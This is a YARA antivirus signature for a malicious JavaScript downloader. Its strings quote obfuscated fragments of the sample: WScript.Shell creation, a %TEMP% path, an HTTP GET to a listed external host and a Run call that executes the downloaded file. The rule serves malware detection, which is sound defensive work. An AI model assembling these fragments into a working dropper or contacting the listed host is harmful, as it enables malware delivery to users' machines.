rule sig_20160427_cc19813c6d78cd8b6f4dd751182b4061 {
  meta:
    description = "datamaliciousorder - file 20160427_cc19813c6d78cd8b6f4dd751182b4061.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0e8dc7ffee1a0f2e7fbd37576d4937c2711b27b5176711a0683080e5e6a453a4"

  strings:
    $s1  = "function BfvueCnyin() {return TonfqQjpql[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"yOjK72F" ascii
    $s2  = "function BfvueCnyin() {return TonfqQjpql[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"yOjK72F" ascii
    $s3  = "function PhgspYleth(){return DmcpqWexob + \"\";};" fullword ascii
    $s4  = "function CyawgKlouo(LqaazDmghu, UdhhfExjsw){EsvypRrhug = EsvypRrhug * 1; return LqaazDmghu - UdhhfExjsw;};" fullword ascii
    $s5  = "NsprqZgmba[EnvguZncif](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var EfpwiWorom = this[\"WScript\"];" fullword ascii
    $s7  = "if (NsprqZgmba[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "var TonfqQjpql = function WrsaaCajia() {return EfpwiWorom[TwdmqCvbcf](\"WScript\"+\".Shell\");}(), PfttiLxvkm = 11;" fullword ascii
    $s9  = "function QbgvuOdzdp() {return ((LljlpJntik == true) && (LljlpJntik == OjinzYjoeo)) ? 1 : EsvypRrhug;};" fullword ascii
    $s10 = "OjinzYjoeo = true; " fullword ascii
    $s11 = "function UqyoxGncoh(){return 23;};" fullword ascii
    $s12 = "function HpsozWbxua(PcmucLmvub) {var MkxyaJlgjl = (1, 2, 3, 4, 5, PcmucLmvub); return MkxyaJlgjl;};" fullword ascii
    $s13 = "LxnblWwdeb = true;" fullword ascii
    $s14 = "var LxnblWwdeb = false;" fullword ascii
    $s15 = "function KhrtkMczad()" fullword ascii
    $s16 = "LljlpJntik = true; " fullword ascii
    $s17 = "function EfopmYvnmf(OufijOavag){TonfqQjpql[\"R\"+\"un\"](OufijOavag, EsvypRrhug, EsvypRrhug);};" fullword ascii
    $s18 = "function FkbbzVjttu(){return TwdmqCvbcf;};" fullword ascii
    $s19 = "var ApipnOsfip = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "}while (PedyoTzyil);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}